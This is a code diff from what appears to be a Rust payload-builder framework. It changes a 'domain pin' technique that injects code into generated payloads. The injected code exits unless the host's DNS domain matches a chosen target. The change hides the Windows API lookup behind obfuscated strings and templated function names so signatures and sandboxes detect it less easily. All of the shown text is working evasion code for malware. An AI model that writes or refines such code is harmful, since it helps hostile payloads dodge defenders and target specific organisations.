@@ -8,29 +8,43 @@ impl Technique for DomainPin {
     fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
         let expected = ctx.param("domain_pin", "domain").unwrap_or("");
         if expected.is_empty() {
-            // user enabled the check but didn't fill in a domain
             return Ok(());
         }
 
-        let sandbox_function = format!(
-"fn evasion_domain_pin_get_name() -> Option<String> {{
-    let mut size: u32 = 256;
-    let mut buffer: Vec<u16> = vec![0; size as usize];
-    let success = unsafe {{ winapi::um::sysinfoapi::GetComputerNameExW(winapi::um::sysinfoapi::ComputerNameDnsDomain, buffer.as_mut_ptr(), &mut size) }};
-    if success == 0 || size == 0 {{ return None; }}
-    let domain_name = String::from_utf16(&buffer[..size as usize]).map(|s| s.trim_end_matches('\\0').to_string()).ok()?;
-    if domain_name.is_empty() {{ return None; }}
-    Some(domain_name)
+        // The expected domain still ends up as a plaintext string literal in
+        // the payload; that is a build-time user input, not a fingerprintable
+        // constant, so leave it as is.
+        let snippet = format!(
+r#"fn {{{{FN_EVASION_DOMAIN}}}}_get_name() -> Option<String> {{
+    static OBF_MOD: &[u8] = &{{{{STR_KERNEL32}}}};
+    static OBF_PROC: &[u8] = &{{{{STR_GET_COMPUTER_NAME_EX_W}}}};
+    type Fn_ = unsafe extern "system" fn(i32, *mut u16, *mut u32) -> i32;
+    unsafe {{
+        let f: Fn_ = match {{{{FN_RESOLVER}}}}(OBF_MOD, OBF_PROC) {{
+            Some(f) => f,
+            None => return None,
+        }};
+        let mut size: u32 = 256;
+        let mut buf: Vec<u16> = vec![0; size as usize];
+        let ok = f(2 /* ComputerNameDnsDomain */, buf.as_mut_ptr(), &mut size);
+        if ok == 0 || size == 0 {{ return None; }}
+        buf.truncate(size as usize);
+        String::from_utf16(&buf).ok().map(|s| s.trim_end_matches('\0').to_string())
+    }}
 }}
-fn evasion_domain_pin() {{
-    match evasion_domain_pin_get_name() {{
-        Some(domain) => {{ if !domain.as_str().eq_ignore_ascii_case(\"{0}\") {{ std::process::exit(0); }} }}
+fn {{{{FN_EVASION_DOMAIN}}}}() {{
+    match {{{{FN_EVASION_DOMAIN}}}}_get_name() {{
+        Some(domain) => {{
+            if !domain.as_str().eq_ignore_ascii_case("{0}") {{
+                std::process::exit(0);
+            }}
+        }}
         None => {{ std::process::exit(0); }}
     }}
 }}
-evasion_domain_pin();", expected);
+{{{{FN_EVASION_DOMAIN}}}}();"#, expected);
 
-        ctx.append_replacement("{{SANDBOX}}", sandbox_function);
+        ctx.append_replacement("{{SANDBOX}}", snippet);
         Ok(())
     }
 }
